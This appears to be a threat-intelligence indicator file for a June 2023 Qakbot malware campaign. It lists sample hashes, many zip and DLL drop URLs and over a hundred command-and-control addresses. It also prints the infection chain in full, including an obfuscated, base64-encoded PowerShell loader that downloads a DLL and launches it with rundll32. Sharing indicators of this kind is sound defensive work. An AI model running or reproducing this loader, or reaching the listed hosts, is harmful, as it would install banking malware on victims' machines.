@@ -1,0 +1,217 @@
+20.06.2023 | Qakbot | obama269 | Campaign  | Version 404.1382
+
+*************************************************
+
+.pdf 2656f782429413a1ec8af4a3ec6834374b1e9b8fd2269c6f7fbe43841e01ba42
+.zip  4bb6c64c22b16df223fb7cef822e8cf820f3eb7dbcb88e5242c18a1b5abc3f2a
+.js abbb0da27ee094eafe8b4f26a48cc2622c5197a7dd6b12115be83ce655688e88
+.dll e13544dde885fd05e325b442c0f02d093a64099abd85d01e0a5f6c3328c9c1c5
+
+*************************************************
+
+Exec >
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\1N27ZFqW0quhb8.js
+
+powershell.exe -encodedcommand "$HorizonsCadbait = "
+aAB0AHQAcABzADoALwAvAG4AbwBuAHMAZQBjAHIAZQB0AGkAbwBuAGEAcgB5AFQAdwBpAHIAbABpAG4AZwAuAGcAaQBmAHQADFsaAB0AHQAcABzADoALwAvADIAMQA5AC4AMgA1ADQALgAxADkANgAuADQANAA = DFsaAB0AHQAcABzADoALwAvAFUAbgBjAG8AbQBwAGUAbABsAGkAbgBnAC4AdgBpAHMAaQBvAG4A ";$mutantDesmose = "
+aAB0AHQAcABzADoALwAvADEAOQAyAC4AMgAyADEALgA1ADkALgA1ADQAmaAB0AHQAcAA6AC8ALwAxADAANgAuADEAOQAwAC4AMQA3ADAALgA3ADAAmaAB0AHQAcAA6AC8ALwAxADUANwAuADEAOAA3AC4AMQA2ADEALgAyADAAMwA = ";$Phyllopteryx = "
+aAB0AHQAcABzADoALwAvAEEAYgBzAHQAcgBhAGMAdABlAHMAdABBAHMAdABlAHIAbwBsAGUAcABpAHMALgByAGUAYwBpAHAAZQBzAA == YSaAB0AHQAcABzADoALwAvADYAOAAuADEAMAAwAC4AMgAzADIALgAxADMAMQA = YSaAB0AHQAcAA6AC8ALwBwAGEAbABhAG0AYQAuAGwAdABkAGEA ";$QuakiestPyelogram = "
+aAB0AHQAcAA6AC8ALwAxADkAOQAuADIAMwA0AC4AMgAxADYALgA3ADAALwBSAHIALwBXAG0AcHhaAB0AHQAcABzADoALwAvAG4AbwBuAGkAbgBmAGUAYwB0AGkAbgBnAEMAbwBsAGkAbgB1AHMALgBjAG8AdQByAHMAZQBzAC8AZQBlAEcAWQAvAGEAbgB1AA == cHhaAB0AHQAcABzADoALwAvAGUAbQBlAHIAawBhAHMALgBjAG8AbQAvAEcAZwBKADgATAB4AG4AaABlAFYALgBkAGEAdAA = cHhaAB0AHQAcABzADoALwAvAGgAbwBsAGkAawBpAG4AYQAuAGMAbwBtAC8ATABkAGkAdABtAC4AZABhAHQAcHhaAB0AHQAcABzADoALwAvAHQAYQBzAGkAcgByAGsAYQByAC4AYwBvAG0ALwBkAGUARgBwAGUAUQA1AHQAdAAuAGQAYQB0AA == cHhaAB0AHQAcABzADoALwAvAGMAaABpAG4AYQBtAG8AYQAuAGMAbwBtAC8AMwBTAGsAbgBxADAAbAAzAFIATgBjAEMALgBkAGEAdAA = cHhaAB0AHQAcABzADoALwAvAHMAZQB1AGMAdQByAGkAdABhAC4AYwBvAG0ALwBUAEoAaAAwADQAOAB6AFAAMgBMAFUAdAAuAGQAYQB0AA == cHhaAB0AHQAcABzADoALwAvAGEAbgBpAGEAdAByAGEALgBjAG8AbQAvAE0AYwA2AHQATAB5AE0AZgBJAGsAZQAuAGQAYQB0AA == ";$Bulbul = "
+aAB0AHQAcAA6AC8ALwA5ADAALgAxADkAOAAuADIAMwA3AC4AMgAxADkA ";foreach ($amentiform in $QuakiestPyelogram -split "
+cHh ") {$indimensible = "
+aAB0AHQAcAA6AC8ALwB0AGkAbgBsAGkAawBlAC4AZABlAG4AdABhAGwA ";try {$kleptomaniac = "
+aAB0AHQAcABzADoALwAvADEAOAA2AC4ANgA1AC4ANgA5AC4ANwA2AA == PoFEaAB0AHQAcABzADoALwAvADEANQAzAC4AMQAwADAALgAyADEAOAAuADEAMwAwAA == PoFEaAB0AHQAcAA6AC8ALwBzAGUAcgBpAGMAbwBuAE8AdQB0AHIAYQBpAHMAaQBuAGcALgBjAGgAPoFEaAB0AHQAcAA6AC8ALwBkAGUAbQBvAGQAdQBsAGEAdABlAC4AbgBsAA == ";$tribbleZoroastra = $amentiform;$alphabets = "
+SQBkAGwAZQBtAGUAbgBGAGEAdABsAGkAbgBnAHMALgBkAGwAbAA = ";$Foxite = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($tribbleZoroastra));$nonrustableTormentable = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($alphabets));Invoke-WebRequest $Foxite -O C:\\ProgramData\\$nonrustableTormentable;$kleptomaniac = "
+aAB0AHQAcABzADoALwAvADEAOAA2AC4ANgA1AC4ANgA5AC4ANwA2AA == PoFEaAB0AHQAcABzADoALwAvADEANQAzAC4AMQAwADAALgAyADEAOAAuADEAMwAwAA == PoFEaAB0AHQAcAA6AC8ALwBzAGUAcgBpAGMAbwBuAE8AdQB0AHIAYQBpAHMAaQBuAGcALgBjAGgAPoFEaAB0AHQAcAA6AC8ALwBkAGUAbQBvAGQAdQBsAGEAdABlAC4AbgBsAA == ";$Indiscerptibly = (Get-Item -Path C:\\ProgramData\\$nonrustableTormentable).Length;$pimpledIdentify = "
+aAB0AHQAcABzADoALwAvADEAMwAzAC4AOAA1AC4ANgAyAC4AMQAxADYAePlaAB0AHQAcAA6AC8ALwAyADMANQAuADEANQA0AC4AMQAwADMALgA3ADQAePlaAB0AHQAcABzADoALwAvAGgAZQB4AGEAZABpAGUAbgBlAC4AcwB1AHAAcABsAGkAZQBzAA == ";$devonicSterilizability = "
+aAB0AHQAcAA6AC8ALwBoAHkAcABlAHIAdABoAGUAcgBtAHkALgBmAHIAbAA = wPFaAB0AHQAcAA6AC8ALwAyADAANgAuADIAMwAxAC4ANwA4AC4AOAA3AA == wPFaAB0AHQAcABzADoALwAvADEAMgA5AC4AMQAzADgALgAxADQANAAuADEANQA3AA == ";if ($Indiscerptibly -ge 79574){$Febriferous = "
+aAB0AHQAcAA6AC8ALwB1AG4AbABlAG4AdABWAGkAcwBjAGUAcgBhAHQAZQBkAC4AaABhAG0AYgB1AHIAZwA = ";$kibitzer = "
+aAB0AHQAcAA6AC8ALwAyADQAMQAuADcANgAuADQANAAuADEANAA1AA == KapaAB0AHQAcAA6AC8ALwBIAGkAcgBzAHUAdABlAEkAbQBwAGUAdAB1AG8AdQBzAG4AZQBzAHMALgB4AHgAeAA = KapaAB0AHQAcABzADoALwAvADEAMwAyAC4AMgA0ADIALgAxADUAMgAuADgAMAA = KapaAB0AHQAcAA6AC8ALwAyADUAMQAuADEAMAAwAC4ANQA5AC4AOAA5AA == ";powershell -encodedcommand "
+JABwAGgAcgBlAG4AbwBnAHIAYQBpAGgAQQBjAGMAcgBlAGQAaQB0AGUAZAAgAD0AIAAiAFIAYQBzAGkAbgBnAFQAcgBpAGMAaABvAGcAeQBuAGUAIgA7ACQAQwByAGUAcABpAHQAdQBzAFIAYQBnAGcAZQByAHkAIAA9ACAAIgBDAG8AcABhAHIAZQBuAGEAcgB5ACIAOwBjAG0AZAAgAC8AYwAgAHIAdQBuAGQAbABsADMAMgAgAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEkAZABsAGUAbQBlAG4ARgBhAHQAbABpAG4AZwBzAC4AZABsAGwALABtAG8AcgBlADsAJABvAHAAaQBzAHQAaABvAGIAcgBhAG4AYwBoAGkAYQB0AGUAQQBuAHQAaAByAG8AcABvAGkAZAAgAD0AIAAiAGgAZQBtAGkAYQB6AHkAZwBvAHUAcwBJAG4AZABvAGMAaQBiAGwAZQAiADsAJABTAHUAYgBtAGUAcgBnAGkAbgBnAEcAcgBlAGEAcwBlAGwAZQBzAHMAIAA9ACAAIgBCAHIAbwBjAGgAbwAiADsAJABTAG8AdQByAGUAcwB0ACAAPQAgACIAaABhAGUAbQBpAGMAQwBvAG4AdABlAG0AcABsAGEAdABvAHIAIgA7AA == ";$Redecorates = "
+aAB0AHQAcABzADoALwAvAHIAZQBlAHIAZQBjAHQAUABlAHIAdgBpAGEAYgBpAGwAaQB0AHkALgBzAGgAbwBwAA == THaAB0AHQAcAA6AC8ALwA3ADEALgAxADUAOAAuADIAMAA0AC4ANAA2AA == THaAB0AHQAcABzADoALwAvADEAOAA4AC4AMQA3ADMALgAyADIANwAuADIANAA4AA == THaAB0AHQAcABzADoALwAvAFAAaABvAHMAcABoAGkAZABlAE4AaQB0AHIAbwB4AHkAbAAuAGUAbgBlAHIAZwB5AA == ";$Preshrunk = "
+aAB0AHQAcABzADoALwAvAEwAYQBuAHUAdgBpAGEAbgBDAGUAcABoAGEAbABvAHQAbwBtAHkALgBiAGwAYQBjAGsACaAB0AHQAcABzADoALwAvAGEAcABwAGwAYQBuAGEAdABpAG8AbgBDAGEAbgBuAG8AbgBpAHMAbQAuAGIAaQBrAGUA ";break;} else {}} catch {}}"
+
+powershell.exe" -encodedcommand $phrenograihAccredited = "RasingTrichogyne";$CrepitusRaggery = "Coparenary";cmd /c rundll32 C:\ProgramData\IdlemenFatlings.dll,more;$opisthobranchiateAnthropoid = "hemiazygousIndocible";$SubmergingGreaseless = "Brocho";$Sourest = "haemicContemplator";
+
+cmd.exe" /c rundll32 C:\ProgramData\IdlemenFatlings.dll,more
+
+rundll32  C:\ProgramData\IdlemenFatlings.dll,more
+
+wermgr.exe
+
+*************************************************
+
+zip drop urls:
+
+http://arrowtex.co.in/glhdyneowx/vodka.gif
+http://bmkoin.online/hdjyexesoh/vodka.gif
+http://brandssolutions.net/volekvtlvg/vodka.gif
+http://darshan-soft.tech/gfohpqduia/vodka.gif
+http://ecomcraze.com/dfhclgbnzn/vodka.gif
+http://grupohuarihuanca.com/jmgaggnnik/vodka.gif
+http://lacquacomunicacao.com.br/ucxshezaro/vodka.gif
+http://lilianmeneghel-imoveis.com.br/jyqcflimmy/vodka.gif
+http://mail-relay.co.za/pjlxhfpnxy/vodka.gif
+http://maquinariaslopez.pe/iijoyzinwr/vodka.gif
+http://micursoadistancia.com/rvdizwwotl/vodka.gif
+http://mirantedosgolfinhos.com.br/gmwarumsve/vodka.gif
+http://tropikalyacarlocations.fr/ijkwkaaers/vodka.gif
+http://tropikalyahotels.com/fxaneqfbpg/vodka.gif
+http://venton.com.br/dwxpmaknry/vodka.gif
+https://agservicioscomplementarios.com.pe/mbdeusxclu/vodka.gif
+https://alfagrain.com/xvyqjxvtqr/vodka.gif
+https://analpesperu.com/zzklwxmtkx/vodka.gif
+https://anitechhub.in/qzebmuwgrs/vodka.gif
+https://ashvin-info.tech/dljhnqhkbm/vodka.gif
+https://aviadors.com/fjuiholwve/vodka.gif
+https://bezerraesaunders.com.br/nkipjyfrxb/vodka.gif
+https://boathiresydney.com.au/wjzmchvery/vodka.gif
+https://consorciosupervisorpyf.com/agobcmupan/vodka.gif
+https://constructorachoqueychavez.pe/weogajufwu/vodka.gif
+https://customizedna.com/ydsporcdci/vodka.gif
+https://ecorpint.com.pe/yemfkwbeod/vodka.gif
+https://introspektiva.com.mx/bodqzcpovm/vodka.gif
+https://islamicsocialpoint.com/dnrqiafduo/vodka.gif
+https://lacquacomunicacao.com.br/qpbmumgzeg/vodka.gif
+https://lanzamientosonline.shop/osijkbahoc/vodka.gif
+https://miayudaenvivo.com/qobriughzs/vodka.gif
+https://mitronindia.in/camcxesznh/vodka.gif
+https://myminiapolis.com/kdokgeeade/vodka.gif
+https://nexgene.co.ke/cheuojhyfo/vodka.gif
+https://primeelevadores.com/gmtltjexrp/vodka.gif
+https://standardzplanners.com/zzsbmefpzt/vodka.gif
+https://sumaqfruits.pe/wbspqminwl/vodka.gif
+https://thestorylinestudio.com/jgrfxfycyn/vodka.gif
+https://tropikalyapub.com/xxmidrvrsj/vodka.gif
+https://venezuelaguia.com/inmsqgovhv/vodka.gif
+https://zasreality.com/tdgcydadcu/vodka.gif
+
+.dll drop urls
+
+https://holikina.com/Lditm.dat
+https://chinamoa.com/3Sknq0l3RNcC.dat
+https://seucurita.com/TJh048zP2LUt.dat
+
+*************************************************
+
+c2's
+
+91.160.70.68:32100
+182.75.189.42:995
+151.62.196.183:443
+72.134.124.16:443
+104.35.24.154:443
+84.215.202.8:443
+71.31.9.226:995
+103.153.180.59:995
+45.62.75.217:443
+95.230.110.222:995
+49.175.72.81:443
+12.172.173.82:22
+168.149.47.12:443
+68.186.65.132:443
+113.11.92.30:443
+116.75.58.218:443
+151.69.32.238:443
+24.138.87.122:995
+96.87.28.170:2222
+147.147.30.126:2222
+109.105.29.93:443
+183.82.107.190:443
+1.221.179.74:443
+2.36.64.159:2078
+12.172.173.82:995
+201.171.159.196:443
+192.252.166.24:80
+176.44.123.169:995
+2.82.8.80:443
+81.150.169.174:2083
+74.12.147.68:2222
+86.248.228.57:2078
+70.160.67.203:443
+75.109.111.89:443
+88.126.94.4:50000
+70.28.50.223:3389
+223.166.13.95:995
+162.248.14.107:443
+70.28.50.223:32100
+84.35.26.14:995
+183.87.163.165:443
+92.186.69.229:2222
+12.172.173.82:993
+174.4.89.3:443
+199.27.66.213:443
+12.172.173.82:50001
+81.229.117.95:2222
+92.9.45.20:2222
+12.172.173.82:20
+91.169.12.198:32100
+213.91.235.146:443
+12.172.173.82:465
+70.28.50.223:2078
+75.98.154.19:443
+136.232.179.26:443
+67.87.119.216:2078
+103.123.223.131:443
+94.204.121.72:443
+103.140.174.20:2222
+95.45.50.93:2222
+72.4.96.62:443
+176.142.207.63:443
+213.64.33.92:2222
+47.34.30.133:443
+70.28.50.223:2087
+47.205.25.170:443
+81.150.169.174:2078
+81.150.169.174:2087
+89.158.150.253:443
+66.241.183.99:443
+188.28.22.221:443
+23.234.237.3:443
+181.230.169.180:443
+184.182.66.109:443
+70.28.50.223:2083
+175.156.65.126:2222
+64.229.117.208:2222
+77.126.99.230:443
+87.252.106.235:995
+12.172.173.82:32101
+161.142.100.114:995
+24.234.220.88:995
+70.28.50.223:1194
+24.234.80.122:995
+81.150.169.174:2222
+121.121.100.202:995
+105.186.138.229:995
+27.0.48.233:443
+80.6.50.34:443
+12.172.173.82:21
+197.3.227.63:443
+68.6.237.243:443
+87.149.116.32:995
+103.212.19.254:995
+90.104.151.37:2222
+178.175.187.254:443
+86.170.169.53:443
+119.82.71.94:2078
+90.7.72.46:2222
+217.165.255.105:443
+116.88.76.28:443
+125.99.69.177:443
+73.155.10.79:443
+103.141.50.46:995
+142.181.206.222:2222
+47.199.241.39:443
+96.255.66.51:995
+64.121.161.102:443
+60.189.130.84:995
+187.199.244.117:32103
+110.159.115.244:443
+72.205.104.134:443
+12.172.173.82:2087
+79.168.224.165:2222
+81.157.120.247:443
+124.122.47.219:443
+201.227.113.134:2222
+103.144.201.52:2078
